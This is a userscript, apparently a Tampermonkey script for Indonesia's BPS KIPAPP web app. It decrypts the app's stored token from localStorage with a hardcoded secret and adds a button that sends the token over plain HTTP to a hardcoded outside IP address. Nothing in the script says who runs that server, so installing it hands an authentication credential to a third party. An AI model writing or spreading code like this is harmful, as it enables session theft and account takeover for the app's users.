// ==UserScript==
// @name         GetTokenForKIPAPP
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Kirim Token
// @author       Anda
// @match        https://webapps.bps.go.id/kipapp/*
// @grant        GM_xmlhttpRequest
// @require      https://cdn.jsdelivr.net/npm/localstorage-slim@2.7.1/dist/localstorage-slim.js
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/525824/GetTokenForKIPAPP.user.js
// @updateURL https://update.greasyfork.org/scripts/525824/GetTokenForKIPAPP.meta.js
// ==/UserScript==


(function() {
    'use strict';

    let button = document.createElement("button");
    button.innerText = "Kirim Token";
    button.style.position = "fixed";
    button.style.bottom = "20px";
    button.style.right = "20px";
    button.style.zIndex = "1000";
    button.style.padding = "10px 15px";
    button.style.backgroundColor = "#28a745";
    button.style.color = "white";
    button.style.border = "none";
    button.style.borderRadius = "5px";
    button.style.cursor = "pointer";

    document.body.appendChild(button);

    let data;
    function waitForLS(callback) {
        if (typeof ls !== "undefined") {
            callback();
        } else {
            setTimeout(() => waitForLS(callback), 100);
        }
    }

    waitForLS(() => {
        console.debug("localstorage-slim tersedia!");

       // data = localStorage.getItem('ka-p-fa0de6036011042cc37f296a888475a2');
        //console.debug(data);
        data = ls.get('ka-p-fa0de6036011042cc37f296a888475a2', {decrypt: true, secret: 2188321});
      //  console.debug(ls.get('ka-p-fa0de6036011042cc37f296a888475a2', {decrypt: true, secret: 2188321}));

    });

    function sendDataToForm() {
        GM_xmlhttpRequest({
            method: "POST",
            url: "http://203.194.113.246:88/token",  // Ubah URL jika diperlukan
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            data: "textarea_input=" + encodeURIComponent(data), // Format x-www-form-urlencoded
            onload: function(response) {
                if (response.status === 200) {
                    alert("Token berhasil dikirim");
                    console.log("Response:", response.responseText);
                } else {
                    alert("Gagal mengirim Token! Status: " + response.status);
                }
            },
            onerror: function(error) {
                alert("Terjadi kesalahan saat mengirim data!");
                console.error("Error:", error);
            }
        });
    }

    button.addEventListener("click", function() {
        sendDataToForm();  // Kirim data ketika tombol diklik
    });

})();